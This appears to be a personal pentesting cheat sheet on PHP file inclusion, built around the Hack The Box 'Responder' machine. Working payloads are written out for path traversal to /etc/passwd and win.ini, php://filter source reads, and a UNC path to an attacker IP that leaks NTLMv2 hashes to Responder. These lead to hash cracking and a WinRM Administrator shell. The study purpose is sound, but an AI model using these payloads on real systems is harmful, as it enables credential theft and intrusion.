---
tags: [web, lfi]
---

> **Local File Inclusion (LFI)** and **Remote File Inclusion (RFI)** are web vulnerabilities that allow including files from the server's filesystem (LFI) or from remote URLs (RFI) by manipulating user input. This guide focuses on what we've practiced: basic path traversal and the LFI → Responder → NTLMv2 → WinRM chain.

---

## Quickstart — Universal test

```bash
# The 3 tests that reveal LFI:
../../../../etc/passwd           # classic path traversal (Linux)
..\..\..\..\windows\win.ini      # path traversal (Windows)
php://filter/convert.base64-encode/resource=index.php    # wrapper test
```

---

## LFI to NTLM Hash Capture — The Responder Chain (Windows)

On **Windows + PHP** targets, LFI/RFI can be chained with Responder to capture NTLMv2 hashes without touching the filesystem. This is a powerful technique when `allow_url_include` is Off and log poisoning isn't viable.

### The attack chain

```
LFI/RFI parameter → UNC path → SMB connection to attacker → Responder captures NTLMv2 hash → Crack with John → WinRM shell
```

### Step 1 — Confirm LFI on a Windows + PHP server

```bash
# Test with a Windows path
http://unika.htb/index.php?page=..\..\..\..\..\..\..\windows\win.ini

# If the file loads → LFI confirmed, and we know it's Windows + PHP
```

### Step 2 — Trigger NTLM authentication via UNC path

PHP's `include()` on Windows resolves UNC paths (`\\host\share`) via SMB. When the server tries to connect to an attacker-controlled UNC path, Windows automatically sends the server process's NTLMv2 hash as part of the SMB handshake.

```bash
# In the vulnerable parameter, use a UNC path pointing to your attacker IP:
http://target.htb/index.php?page=\\10.10.14.5\file

# Or URL-encoded (for browser testing):
http://target.htb/index.php?page=%5C%5C10.10.14.5%5Cfile
```

### Step 3 — Capture the hash with Responder

```bash
# Start Responder on your VPN interface
$ sudo responder -I tun0

# When the target connects, Responder captures:
[SMB] NTLMv2-SSP Client   : 10.129.12.192
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:8289f1...00000000
```

> 💡 **Why it works:** PHP's `include()` on Windows calls the Win32 API to open files. UNC paths (`\\host\share\file`) trigger the SMB client to authenticate to the specified host. Responder impersonates an SMB server and captures the NTLMv2 challenge-response.

### Step 4 — Crack the NTLMv2 hash

```bash
# Save the captured hash to a file, then crack:
$ john --format=netntlmv2 hash.txt
```

### Step 5 — Get a shell with the cracked credentials

```bash
# If WinRM (5985) is open:
$ evil-winrm -i target.htb -u Administrator -p 'cracked_password'

# Or with NetExec for quick command execution:
$ netexec winrm target.htb -u Administrator -p 'cracked_password' -x 'whoami'
```

### Prerequisites for this technique

| Requirement | How to verify |
| :-------- | :--------------- |
| Windows OS | nmap `-O` or check if `C:\Windows\win.ini` loads |
| PHP server | Apache/Nginx with PHP on Windows |
| LFI or RFI parameter | Any parameter that calls `include()`, `require()` |
| SMB outbound (445) | The target must be able to reach your attacker IP on port 445 |
| Responder running | `sudo responder -I tun0` on your attacker machine |

### Responder chain troubleshooting

| Problem | Solution |
| :------- | :------- |
| No hash captured | Check firewall — port 445 must be reachable from the target |
| Hash captured but won't crack | NTLMv2 can take time — use rules or a larger wordlist |
| `include()` doesn't resolve UNC | Some PHP configs disable UNC paths — try another parameter |
| Responder shows SMB but no hash | The target may require SMB signing — try another coercion method |

### Real example — HTB Responder

This exact chain appears in the **Responder** machine:
1. Discover virtual host `unika.htb`
2. Find `?page=` parameter that includes PHP files
3. Test LFI with `..\..\..\..\windows\win.ini` → confirmed
4. Trigger RFI with `\\10.10.14.5\file` → Responder captures Administrator's NTLMv2
5. Crack with John → password: `badminton`
6. NetExec WinRM → `(Pwn3d!)` → shell as Administrator

---

## LFI Traversal — The basics

### Standard path traversal

```bash
# Linux
../../../../etc/passwd
/../../../etc/passwd
....//....//....//....//etc/passwd    # double traversal (bypasses some filters)

# Windows
..\..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts
```

### Absolute vs relative paths

```bash
# Relative (more common in CTFs)
http://target.htb/page.php?file=../../../../etc/passwd

# Absolute
http://target.htb/page.php?file=/etc/passwd

# Drive letter (Windows)
http://target.htb/page.php?file=C:\Windows\win.ini
```

### Sensitive files by OS

| Linux | Windows |
| :---- | :------ |
| `/etc/passwd` | `C:\Windows\win.ini` |
| `/var/www/html/config.php` | `C:\Windows\System32\drivers\etc\hosts` |
| `/var/log/apache2/access.log` | `C:\inetpub\wwwroot\web.config` |

---

## PHP Wrappers — The essentials

### `php://filter` — Read source code as base64

```bash
# Read index.php
http://target.htb/page.php?file=php://filter/convert.base64-encode/resource=index.php

# Read config.php
http://target.htb/page.php?file=php://filter/convert.base64-encode/resource=config.php

# Decode locally
echo "PD9waHAg..." | base64 -d
```

> 💡 **Why it works:** `php://filter` converts the file content to base64 *before* `include()` processes it. Since base64 is plain text, PHP won't try to execute it as code.

---

## Common LFI parameters to fuzz

```bash
# These parameters often accept file paths:
file, page, include, inc, dir, path, folder, root, doc
lang, cmd, pg, style, pdf, template, php_path, doc_path
module, mod, content, site, load, show, read, view
```

---

## 🔗 Related

**Machines:** [[🧑‍🚒 Responder]]

**Guides:** [[🔐 NTLM]], [[🖥️ WinRM]]

---

## References

- [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks — File Inclusion / Path Traversal](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [OWASP — File Inclusion](https://owasp.org/www-community/attacks/Includes)
- [PHP Stream Wrappers Manual](https://www.php.net/manual/en/wrappers.php)
